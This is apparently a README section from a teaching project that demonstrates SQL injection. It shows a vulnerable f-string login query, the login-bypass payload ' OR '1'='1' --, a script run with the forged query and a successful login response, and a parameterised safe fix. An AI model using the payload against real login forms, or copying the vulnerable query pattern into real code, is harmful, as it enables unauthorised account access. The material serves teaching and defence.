# SQL injection

### Vulnerable code for injection:
```
cur.execute(f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'")
```

### SQL injection examples:  
Input belows info in website to login:  
* username: `' OR '1'='1' --`  
* there's no need to input teh password   
  
Or open a new terminal and run:
```
$ cd attacks/sql_injection
$ python inject.py
```
This results in the SQL query:
```
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''
```
And then you can get the result:
```
{
  "data": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IicgT1IgJzEnPScxJyAtLSIsInBhc3N3b3JkIjoicGJrZGYyOnNoYTI1NjoyNjAwMDAkOUNFaERmbm1VdUNqUlhGayQ2MzliNTcwOTZlODRiMGQzOGEwYTU3OTg4YjYxZTg0NWNjZWQ1ZDlkYmY5YmUzN2JjNzAxN2ZiZjNhNGQ4MmNlIiwiZXhwIjoxNzEyOTQzMTYzfQ.tJscl8WUfGk8nFkj-cer4BhwZT5ZBpSv3vM_P9bZgbE",
    "user": {
      "username": "' OR '1'='1' --"
    }
  },
  "msg": "User logged in successfully.",
  "status": "SUCCESS"
}
```

### Safe code:

```
cur.execute("SELECT * FROM users WHERE username = ?",(username,))
check_password_hash(user["password"], password)
```